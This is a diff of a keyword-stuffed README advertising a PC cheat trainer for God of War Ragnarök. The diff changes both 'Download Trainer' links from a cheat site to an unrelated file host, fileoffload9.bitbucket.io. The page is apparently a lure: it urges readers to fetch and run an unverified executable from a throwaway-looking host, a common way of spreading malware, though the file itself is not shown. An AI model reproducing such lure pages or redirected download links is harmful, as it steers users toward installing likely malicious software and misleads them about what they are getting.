@@ -4,7 +4,7 @@
 
 With a single button press, you control health, rage, gear, and time itself.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/god-of-war-ragnarok/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload9.bitbucket.io)
 ---
 
 ## 🎮 What Is a God of War Ragnarök Trainer?
@@ -19,7 +19,7 @@ A **trainer** is a standalone cheat tool for PC that hooks into the game and off
 
 Perfect for single-player story runs, NG+ chaos playthroughs, or experimenting with maxed-out combat builds.
 
-[![Download Trainer](https://i.ytimg.com/vi/7y_Y0s6WyCc/maxresdefault.jpg)](https://wecheaters.github.io/cheats/god-of-war-ragnarok/)
+[![Download Trainer](https://i.ytimg.com/vi/7y_Y0s6WyCc/maxresdefault.jpg)](https://fileoffload9.bitbucket.io)
 ---
 
 ## 🔥 God-Tier Features in the Ragnarök Trainer
@@ -111,3 +111,4 @@ god of war ragnarök trainer, infinite rage cheat, one-hit kill kratos, god mode
 
 **Unleash the god inside the god.**
 With a **God of War Ragnarök Trainer**, there are no limits — only chaos, glory, and raw power. ⚔️🔥👑
+
